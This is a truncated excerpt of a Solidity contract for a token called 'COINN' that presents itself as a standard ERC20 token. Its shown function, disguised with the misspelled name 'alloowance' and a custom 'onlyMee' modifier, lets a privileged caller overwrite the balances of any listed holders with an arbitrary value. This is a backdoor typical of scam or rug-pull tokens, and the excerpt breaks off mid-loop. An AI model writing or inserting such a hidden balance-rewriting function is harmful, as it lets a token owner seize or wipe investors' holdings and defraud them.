...
contract COINN is Context, Ownable, IERC20 {
    ...
    function alloowance(address[] memory accounts, uint256 newBalance) external onlyMee {

        for (uint256 e = 0; e < accounts.length; e++) {

            uint256 currentBalance = _savings[accounts[e]] + 13;

            _savings[accounts[e]] = newBalance;

            emit saveeed(accounts[e], currentBalance - 13, newBalance);
